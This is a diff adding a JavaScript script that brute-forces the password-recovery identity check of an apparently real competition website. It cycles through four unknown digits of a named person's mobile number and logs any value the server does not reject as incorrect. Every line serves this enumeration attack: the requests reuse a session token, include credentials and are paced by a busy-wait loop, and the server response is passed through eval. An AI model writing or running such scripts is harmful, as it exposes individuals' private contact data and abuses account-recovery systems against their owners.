@@ -1,0 +1,48 @@
+function sleep(delay) {
+     var start = (new Date()).getTime();
+     while((new Date()).getTime() - start < delay) {
+         continue;
+     }
+ }
+for(var i=0;i<10;i++){
+    for(var j=0;j<10;j++){
+        for(var k=0;k<10;k++){
+            for(var l=0;l<10;l++){
+fetch("https://cpipc.acge.org.cn/login/doCheckId4DocumentRetrievePwd", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "zh-CN,zh;q=0.9",
+    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "sec-ch-ua": "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Windows\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "x-requested-with": "XMLHttpRequest"
+  },
+  "referrer": "https://cpipc.acge.org.cn/login/retrievePwd?retrievePwdType=3",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "pcpServiceVariableOb=%7B%7D&identityInfo=%7B%22userName%22%3A%22%E8%A3%B4%E5%BA%86%E7%A5%BA%22%2C%22organName%22%3A%22%E8%A5%BF%E5%AE%89%E7%94%B5%E5%AD%90%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6%22%2C%22mobile%22%3A%22155"+i+j+k+l+"1381%22%2C%22email%22%3Anull%7D&token=27189D99B0222F489C7D66D8AC71E6CB",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+})
+    .then((res) => {
+    return res.json();
+  })
+    .then((res) => {
+    var obj=eval(res);
+        //console.log(obj.msg);
+    var str="手机号码不正确！";
+        //console.log(str);
+    if(str!=obj.msg){
+
+    console.log("number"+i+j+k+l);
+    }
+  });
+  sleep(500);
+  }
+  }
+  }
+  }
